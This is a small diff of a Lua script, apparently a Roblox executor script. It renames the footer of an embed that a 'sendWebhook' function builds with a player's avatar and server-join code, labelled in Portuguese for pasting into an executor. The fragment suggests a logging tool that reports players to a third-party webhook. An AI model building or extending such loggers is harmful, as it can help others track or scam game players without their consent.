@@ -66,7 +66,7 @@ local function sendWebhook(pl)
             {name = "🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value = tpcode, inline = false}
         },
         thumbnail = { url = avatar },
-        footer = { text = "Freeman Grants - Log System" }
+        footer = { text = "Auralynx - Log System" }
     }
     local payload = {embeds = {embed}}
     local body = h:JSONEncode(payload)
